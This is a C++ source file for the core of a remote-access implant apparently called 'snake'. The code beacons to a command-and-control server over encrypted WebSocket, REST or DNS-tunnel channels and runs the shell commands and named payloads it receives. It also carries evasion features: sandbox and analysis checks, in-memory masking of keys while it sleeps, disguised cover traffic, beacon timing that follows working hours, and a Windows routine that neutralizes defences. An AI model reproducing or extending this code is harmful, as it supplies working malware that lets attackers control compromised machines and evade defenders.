#include "snake/implant.hpp"

#include <algorithm>
#include <chrono>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <ctime>
#include <random>
#include <thread>

#include <nlohmann/json.hpp>

#include "snake/antianalysis.hpp"
#include "snake/dns.hpp"
#include "snake/implant_platform.hpp"
#include "snake/malleable.hpp"
#include "snake/net.hpp"
#include "snake/payloads.hpp"
#include "snake/protocol.hpp"
#include "snake/stealth.hpp"

namespace snake {

namespace {

std::mt19937& rng() {
    static thread_local std::mt19937 g([] {
        std::random_device rd;
        std::seed_seq seq{rd(), rd(), rd(), rd(),
                          (unsigned)std::chrono::steady_clock::now().time_since_epoch().count()};
        return std::mt19937(seq);
    }());
    return g;
}

std::string random_hex32() { return to_hex(random_bytes(16)); }

bool parse_wss_url(const std::string& url, std::string& host, uint16_t& port, std::string& path) {
    const std::string pref = "wss://";
    if (url.rfind(pref, 0) != 0) return false;
    std::string rest = url.substr(pref.size());
    size_t slash = rest.find('/');
    std::string hp = (slash == std::string::npos) ? rest : rest.substr(0, slash);
    path = (slash == std::string::npos) ? SNAKE_OBF("/ws") : rest.substr(slash);
    if (hp.empty() || hp[0] == '[') return false;
    size_t colon = hp.rfind(':');
    if (colon == std::string::npos) {
        host = hp;
        port = 443;
    } else {
        host = hp.substr(0, colon);
        long p = std::strtol(hp.substr(colon + 1).c_str(), nullptr, 10);
        if (p <= 0 || p > 65535) return false;
        port = (uint16_t)p;
    }
    return !host.empty();
}

std::string make_envelope(const Bytes& key, const Bytes& plaintext) {
    auto sealed = aead_encrypt(key, plaintext);
    nlohmann::ordered_json j;
    j["data"] = to_b64(sealed);
    return j.dump();
}

std::optional<Bytes> open_envelope(const Bytes& key, const std::string& body) {
    try {
        auto j = nlohmann::ordered_json::parse(body);
        std::string d = j.value("data", "");
        if (d.empty()) return std::nullopt;
        auto raw = from_b64(d);
        if (!raw) return std::nullopt;
        return aead_decrypt(key, *raw);
    } catch (...) {
        return std::nullopt;
    }
}

std::optional<net::HttpResponse> rest_post(const std::string& host, uint16_t port,
                                           const net::TlsOptions& opts, const std::string& path,
                                           const net::HeaderList& headers, const std::string& body) {
    net::TlsClient tls;
    if (!tls.connect(host, port, opts)) return std::nullopt;
    return net::http_request(tls, "POST", host, port, path, headers, body);
}

int jitter_interval_secs(int mn, int mx) {
    if (mn <= 0) mn = 60;
    if (mx <= 0) mx = 300;
    std::uniform_int_distribution<int> dist(mn, mx);
    int interval = dist(rng());
    int hour = implant::local_hour();
    if (hour >= 1 && hour <= 5) {
        interval *= 3;
    } else if (hour >= 9 && hour <= 17) {
        interval = interval * 7 / 10;
    }
    return interval;
}

}  // namespace

std::string implant_os_name() {
#if defined(__linux__)
    return "linux";
#elif defined(__APPLE__)
    return "darwin";
#elif defined(_WIN32)
    return "windows";
#else
    return "unknown";
#endif
}

std::string implant_arch_name() {
#if defined(__x86_64__) || defined(_M_X64)
    return "amd64";
#elif defined(__aarch64__) || defined(_M_ARM64)
    return "arm64";
#elif defined(__i386__)
    return "386";
#elif defined(__arm__)
    return "arm";
#else
    return "unknown";
#endif
}

Implant::Implant(ImplantConfig cfg) : cfg_(std::move(cfg)) {
    id_ = cfg_.forced_id.empty() ? random_hex32() : cfg_.forced_id;
    if (id_.size() < 16) id_.resize(16, '0');
    hostname_ = implant::hostname();
    start_time_ = (long long)std::time(nullptr);
    inflight_.reserve(65536);
}

void Implant::log(const std::string& m) { std::fprintf(stderr, "[implant] %s\n", m.c_str()); }

void Implant::debug_log(const std::string& m) {
    if (cfg_.debug) log(m);
}

std::string Implant::target_proc() { return implant::target_proc_name(); }

net::HeaderList Implant::profile_headers(bool json) const {
    net::HeaderList h;
    if (json) h.push_back({"Content-Type", "application/json"});
    h.push_back({"User-Agent", malleable::effective_user_agent(cfg_.profile)});
    for (const auto& e : malleable::effective_headers(cfg_.profile)) {
        h.push_back({e.name, e.value});
    }
    return h;
}

malleable::TemplateVars Implant::template_vars() const {
    malleable::TemplateVars v;
    v.id = id_.substr(0, 16);
    v.hostname = hostname_;
    v.os = implant_os_name();
    v.arch = implant_arch_name();
    v.random_hex = to_hex(random_bytes(8));
    return v;
}

bool Implant::expand_endpoint(const std::string& tmpl, std::string& out) {
    std::string err;
    std::string value = tmpl;
    if (!malleable::expand_path(value, template_vars(), out, err)) {
        log("profile path template error: " + err);
        return false;
    }
    return true;
}

void Implant::send_cover_traffic(const std::string& host, uint16_t port,
                                 const net::TlsOptions& opts) {
    int n = malleable::effective_cover_count(cfg_.profile);
    if (n <= 0) return;
    int sent = 0;
    for (int i = 0; i < n; i++) {
        std::string path;
        if (!expand_endpoint(malleable::effective_cover_path(cfg_.profile, (std::size_t)i), path)) {
            break;
        }
        net::TlsClient tls;
        if (!tls.connect(host, port, opts)) {
            debug_log("cover request connect failed: " + tls.error());
            break;
        }
        auto r = net::http_request(tls, "GET", host, port, path, profile_headers(false), "");
        if (!r) {
            debug_log("cover request failed: " + path);
            break;
        }
        sent++;
    }
    debug_log("cover traffic: " + std::to_string(sent) + "/" + std::to_string(n) +
              " request(s) sent");
}

std::string Implant::lifetime_expiry() const {
    return lifetime_expiry_reason(cfg_.lifetime, (long long)std::time(nullptr), start_time_);
}

void Implant::self_destruct(const std::string& reason) {
    log("lifetime policy expired: " + reason + " - self-destruct");
    lifetime_tripped_ = true;
    stop_ = true;
}

bool Implant::schedule_allows_now() const {
    if (!cfg_.schedule.has_work_hours && !cfg_.schedule.has_work_days) return true;
    int wd = 0, hh = 0, mm = 0;
    schedule_local_now(wd, hh, mm);
    return schedule_active(cfg_.schedule, wd, hh, mm);
}

std::vector<MaskRegion> Implant::sensitive_regions() {
    std::vector<MaskRegion> regions;
    auto add = [&](void* p, std::size_t n) {
        if (p != nullptr && n != 0) regions.push_back(MaskRegion{p, n});
    };
    add(cfg_.session_key.data(), cfg_.session_key.size());
    add(cfg_.c2_url.data(), cfg_.c2_url.size());
    add(cfg_.fingerprint.data(), cfg_.fingerprint.size());
    add(cfg_.dns_domain.data(), cfg_.dns_domain.size());
    add(id_.data(), id_.size());
    add(inflight_.data(), inflight_.size());
    return regions;
}

void Implant::masked_sleep(long long seconds, const std::function<bool()>& tick) {
    if (seconds <= 0) return;
    MaskReport rep = mask_.mask(sensitive_regions());
    if (rep.ok && rep.regions > 0) {
        debug_log("sleep mask: " + std::to_string(rep.regions) + " regions / " +
                  std::to_string(rep.bytes) + " bytes locked + encrypted for " +
                  std::to_string(seconds) + "s (" + std::to_string(rep.locked) +
                  "/" + std::to_string(rep.regions) + " locked)");
    } else if (!rep.ok) {
        debug_log("sleep mask: not applied: " + rep.error);
    }
    long long left = seconds;
    while (left > 0 && !stop_) {
        long long s = std::min<long long>(left, 5);
        std::this_thread::sleep_for(std::chrono::seconds(s));
        left -= s;
        if (tick && tick()) break;
    }
    MaskReport back = mask_.unmask();
    if (rep.ok && rep.regions > 0) {
        debug_log("sleep mask: restored " + std::to_string(back.regions) + " regions" +
                  (back.ok ? "" : (" (" + back.error + ")")));
    }
}

void Implant::wipe_state() {
    (void)mask_.unmask();
    zeroize(cfg_.session_key);
    id_.clear();
}

bool Implant::environment_check() {
    int checks = 0;
    if (implant::uptime_secs() >= 300) checks++;
    if (implant::disk_total_gb() >= 10.0) checks++;
    if (implant::num_cpu() >= 2) checks++;
    debug_log("environment check: " + std::to_string(checks) + "/3 passed");
    bool c3_ok = checks >= 2;
    if (!cfg_.analysis.enabled) return c3_ok;
    AnalysisReadings r = gather_readings();
    AnalysisVerdict v = analysis_verdict(r, cfg_.analysis);
    std::string ev;
    for (const std::string& s : v.reasons) ev += (ev.empty() ? "" : "; ") + s;
    debug_log("analysis gate: score " + std::to_string(v.score) + "/" +
              std::to_string(cfg_.analysis.threshold) + (v.hostile ? " HOSTILE" : " clean") +
              (ev.empty() ? "" : " - " + ev));
    return c3_ok && !v.hostile;
}

AnalysisReadings Implant::gather_readings() {
    const char* spec = std::getenv("SNAKE_ANALYSIS_READINGS");
    AnalysisReadings r;
    if (spec != nullptr && *spec != '\0' && analysis_readings_from_spec(spec, r)) {
        debug_log("analysis readings injected (SNAKE_ANALYSIS_READINGS)");
        return r;
    }
    r.uptime_secs = implant::uptime_secs();
    r.disk_total_gb = implant::disk_total_gb();
    r.cpu_count = implant::num_cpu();
    r.ram_total_mb = implant::ram_total_mb();
    r.mac_addresses = implant::mac_addresses();
    r.process_names = implant::running_process_names();
    return r;
}

bool Implant::beacon_primary() {
    std::string host, path;
    uint16_t port = 443;
    if (!parse_wss_url(cfg_.c2_url, host, port, path)) {
        log("bad C2 URL: " + cfg_.c2_url);
        return false;
    }
    if (cfg_.profile.enabled && !cfg_.profile.ws_path.empty() &&
        !expand_endpoint(cfg_.profile.ws_path, path)) {
        return false;
    }

    net::TlsOptions opts;
    opts.skip_verify = cfg_.skip_tls_verify;
    opts.ca_file = cfg_.ca_file;
    opts.fingerprint_hex = cfg_.fingerprint;

    net::TlsClient tls;
    if (!tls.connect(host, port, opts)) {
        log("connect failed: " + tls.error());
        return false;
    }
    net::WsClient ws;
    if (!ws.handshake(tls, host, port, path, profile_headers(false))) {
        log("ws handshake failed: " + ws.error());
        return false;
    }
    debug_log("ws connected: " + host + ":" + std::to_string(port) + path);

    protocol::BeaconPayload b;
    b.id = id_.substr(0, 16);
    b.type = implant_os_name();
    b.target = target_proc();
    b.ts = (int64_t)std::time(nullptr);
    b.jitter = 0.0;
    b.hostname = hostname_;
    b.arch = implant_arch_name();

    std::string bj = protocol::to_json(b);
    inflight_.assign(bj.begin(), bj.end());
    auto enc = aead_encrypt(cfg_.session_key, inflight_);
    if (enc.empty() || !ws.send_binary(enc)) {
        log("beacon send failed");
        return false;
    }
    debug_log("beacon sent (id " + b.id + ")");

    auto msg = ws.recv_message();
    if (!msg) {
        log("task read failed: " + ws.error());
        return false;
    }
    auto dec = aead_decrypt(cfg_.session_key, *msg);
    if (!dec) {
        log("task decrypt failed");
        return false;
    }
    std::string tasks_json(dec->begin(), dec->end());
    auto tasks = protocol::tasks_from_json(tasks_json);
    debug_log("tasks received: " + std::to_string(tasks.size()));

    for (const auto& task : tasks) {
        protocol::TaskResult result = execute_task(task);
        std::string rj = protocol::to_json(result);
        inflight_.assign(rj.begin(), rj.end());
        auto renc = aead_encrypt(cfg_.session_key, inflight_);
        if (renc.empty() || !ws.send_binary(renc)) {
            log("result send failed (task " + task.id + ")");
            return false;
        }
        debug_log("result sent (task " + task.id + ")");
    }

    send_cover_traffic(host, port, opts);
    return true;
}

protocol::TaskResult Implant::execute_task(const protocol::Task& task) {
    protocol::TaskResult result;
    result.task_id = task.id;
    result.ts = (int64_t)std::time(nullptr);

    if (task.type == "shell") {
            auto it = task.payload.find("command");
            std::string cmd = (it != task.payload.end()) ? it->second : "";
            if (cmd.empty()) {
                result.success = false;
                result.error = "no command";
            } else {
                implant::ShellOutput sr = implant::run_shell(cmd);
                if (sr.timed_out) {
                    result.success = true;
                    result.output = sr.out;
                } else if (sr.signaled) {
                    result.success = false;
                    result.error = (sr.signal_no == implant::kKillSignal)
                                       ? "signal: killed"
                                       : ("signal: " + std::to_string(sr.signal_no));
                } else if (sr.exit_code != 0) {
                    result.success = false;
                    result.error = "exit status " + std::to_string(sr.exit_code);
                } else {
                    result.success = true;
                    result.output = sr.out + (sr.err.empty() ? "" : ("\nSTDERR: " + sr.err));
                }
            }
        } else if (task.type == "recon") {
            nlohmann::ordered_json j;
            j["os"] = implant_os_name();
            j["arch"] = implant_arch_name();
            j["hostname"] = hostname_;
            j["cpus"] = implant::num_cpu();
            j["gover"] = "n/a";
            result.success = true;
            result.output = j.dump(2);
        } else if (task.type == "upload") {
            result.success = true;
            result.output = "upload queued";
        } else if (task.type == "download") {
            result.success = true;
            result.output = "download queued";
        } else if (task.type == "sleep") {
            std::string reason = lifetime_expiry();
            if (!reason.empty()) {
                self_destruct(reason);
                result.success = true;
                result.output = "self-destruct initiated";
            } else {
                result.success = true;
                result.output = "sleep command received";
            }
        } else if (task.type == "payload") {
            auto it = task.payload.find("name");
            std::string name = (it != task.payload.end()) ? it->second : "";
            if (name.empty()) {
                result.success = false;
                result.error = "no payload name specified";
            } else {
                try {
                    payloads::Args args = payloads::ExecuteTaskArgs(task.payload);
                    result.success = true;
                    result.output = payloads::ExecuteByName(name, args);
                } catch (const std::exception& e) {
                    result.success = false;
                    result.error = "payload " + name + ": " + e.what();
                }
            }
        } else if (task.type == "exit") {
            result.success = true;
            result.output = "self-destruct initiated";
            stop_ = true;
        } else {
            result.success = false;
            result.error = "unknown task type: " + task.type;
        }

    return result;
}

bool Implant::beacon_rest() {
    std::string host, path;
    uint16_t port = 443;
    if (!parse_wss_url(cfg_.c2_url, host, port, path)) {
        log("bad C2 URL: " + cfg_.c2_url);
        return false;
    }

    net::TlsOptions opts;
    opts.skip_verify = cfg_.skip_tls_verify;
    opts.ca_file = cfg_.ca_file;
    opts.fingerprint_hex = cfg_.fingerprint;

    protocol::BeaconPayload b;
    b.id = id_.substr(0, 16);
    b.type = implant_os_name();
    b.target = target_proc();
    b.ts = (int64_t)std::time(nullptr);
    b.jitter = 0.0;
    b.hostname = hostname_;
    b.arch = implant_arch_name();

    std::string bj = protocol::to_json(b);
    inflight_.assign(bj.begin(), bj.end());
    std::string env = make_envelope(cfg_.session_key, inflight_);
    std::string bpath;
    if (!expand_endpoint(malleable::effective_endpoints(cfg_.profile).beacon, bpath)) {
        return false;
    }
    auto resp = rest_post(host, port, opts, bpath, profile_headers(true), env);
    if (!resp || resp->status != 200) {
        log("rest beacon failed");
        return false;
    }
    auto dec = open_envelope(cfg_.session_key, resp->body);
    if (!dec) {
        log("rest beacon decrypt failed");
        return false;
    }
    std::string tasks_json(dec->begin(), dec->end());
    auto tasks = protocol::tasks_from_json(tasks_json);
    debug_log("rest beacon ok; tasks: " + std::to_string(tasks.size()));

    for (const auto& task : tasks) {
        protocol::TaskResult result = execute_task(task);
        std::string rj = protocol::to_json(result);
        inflight_.assign(rj.begin(), rj.end());
        std::string renv = make_envelope(cfg_.session_key, inflight_);
        std::string rpath;
        if (!expand_endpoint(malleable::effective_endpoints(cfg_.profile).result, rpath)) {
            return false;
        }
        auto rresp = rest_post(host, port, opts, rpath, profile_headers(true), renv);
        if (!rresp || rresp->status != 200) {
            log("rest result post failed (task " + task.id + ")");
            return false;
        }
        debug_log("result sent via rest (task " + task.id + ")");
    }
    send_cover_traffic(host, port, opts);
    return true;
}

bool Implant::beacon_dns() {
    if (cfg_.dns_domain.empty()) {
        debug_log("dns channel: no --dns domain configured");
        return false;
    }
    std::string salt_s = "dns-tunnel";
    Bytes salt(salt_s.begin(), salt_s.end());
    Bytes dns_key = derive_session_key(cfg_.session_key, salt);

    protocol::BeaconPayload b;
    b.id = id_.substr(0, 16);
    b.type = implant_os_name();
    b.target = target_proc();
    b.ts = (int64_t)std::time(nullptr);

    std::string bj = protocol::to_json(b);
    snake::dns::ExfilOptions opts;
    opts.domain = cfg_.dns_domain;
    opts.resolver = cfg_.dns_resolver;
    bool ok = snake::dns::exfiltrate(dns_key, Bytes(bj.begin(), bj.end()), "beacon", opts);
    debug_log(std::string("dns beacon ") + (ok ? "sent" : "failed"));
    return ok;
}

int Implant::run() {
    log("started: " + id_.substr(0, 8) + " (proc: " + target_proc() + ")");
    if (cfg_.lifetime.has_kill_date || cfg_.lifetime.has_max_runtime) {
        debug_log("lifetime policy armed: kill_date=" +
                  std::string(cfg_.lifetime.has_kill_date ? std::to_string(cfg_.lifetime.kill_date_epoch)
                                                           : "none") +
                  " max_runtime=" +
                  std::string(cfg_.lifetime.has_max_runtime ? std::to_string(cfg_.lifetime.max_runtime_secs)
                                                             : "none"));
    }
    if (cfg_.schedule.has_work_hours || cfg_.schedule.has_work_days) {
        debug_log("work profile armed: work_hours=" +
                  std::string(cfg_.schedule.has_work_hours
                                  ? std::to_string(cfg_.schedule.hours.start_min) + "-" +
                                        std::to_string(cfg_.schedule.hours.end_min)
                                  : "none") +
                  " work_days=" +
                  std::string(cfg_.schedule.has_work_days ? std::to_string(cfg_.schedule.days_mask)
                                                          : "none") +
                  " (local time)");
    }
    if (!mask_.enabled()) debug_log("sleep mask disabled (SNAKE_NO_SLEEP_MASK)");
    if (cfg_.analysis.enabled) {
        debug_log("analysis gate armed: threshold=" + std::to_string(cfg_.analysis.threshold) +
                  " vm_oui=" + std::string(cfg_.analysis.check_vm_oui ? "on" : "off") +
                  " tools=" + std::string(cfg_.analysis.check_tool_names ? "on" : "off"));
    }
    if (cfg_.evade.any()) {
        debug_log("evade armed: " + evade::policy_summary(cfg_.evade));
#ifdef _WIN32
        debug_log("evade: neutralized " + std::to_string(evade::apply(cfg_.evade)) + " target(s)");
#else
        debug_log("evade: not supported on this platform (no-op)");
#endif
    }
    if (cfg_.profile.enabled) {
        debug_log("malleable profile: " + malleable::profile_summary(cfg_.profile));
    }
    {
        std::string reason = lifetime_expiry();
        if (!reason.empty()) {
            self_destruct(reason + " (at start)");
            log("exiting without beaconing");
            wipe_state();
            return 0;
        }
    }
    if (!environment_check()) {
        log("environment check failed, going dormant");
        masked_sleep(3600, [this] {
            if (stop_) return true;
            std::string reason = lifetime_expiry();
            if (!reason.empty()) {
                self_destruct(reason);
                return true;
            }
            return false;
        });
        if (stop_) {
            log("exiting without beaconing");
            wipe_state();
            return 0;
        }
        if (!environment_check()) {
            log("hostile environment");
            return 1;
        }
    }

    while (!stop_) {
        {
            std::string reason = lifetime_expiry();
            if (!reason.empty()) {
                self_destruct(reason);
                break;
            }
        }
        if (!cfg_.schedule.has_work_hours && !cfg_.schedule.has_work_days) {
        } else if (schedule_allows_now()) {
            debug_log("inside work profile");
        } else {
            int wd = 0, hh = 0, mm = 0;
            schedule_local_now(wd, hh, mm);
            long long wait = schedule_seconds_until_active(cfg_.schedule, wd, hh, mm);
            debug_log("outside work profile: parking " + std::to_string(wait) + "s");
            masked_sleep(wait, [this] {
                std::string reason = lifetime_expiry();
                if (!reason.empty()) {
                    self_destruct(reason);
                    return true;
                }
                return schedule_allows_now();
            });
            if (stop_) break;
            continue;
        }

        bool ok = false;
        if (cfg_.channel == "ws") {
            ok = beacon_primary();
        } else if (cfg_.channel == "rest") {
            ok = beacon_rest();
        } else if (cfg_.channel == "dns") {
            ok = beacon_dns();
        } else {
            ok = beacon_primary();
            if (!ok) ok = beacon_rest();
            if (!ok && !cfg_.dns_domain.empty()) ok = beacon_dns();
        }
        if (!ok) debug_log("beacon cycle failed on all channels");
        if (cfg_.once) break;

        int secs = jitter_interval_secs(cfg_.beacon_min, cfg_.beacon_max);
        debug_log("sleeping " + std::to_string(secs) + "s");
        masked_sleep(secs, [this] {
            std::string reason = lifetime_expiry();
            if (!reason.empty()) {
                self_destruct(reason);
                return true;
            }
            return false;
        });
    }
    if (lifetime_tripped_) log("self-destruct complete");
    wipe_state();
    return 0;
}

}  // namespace snake
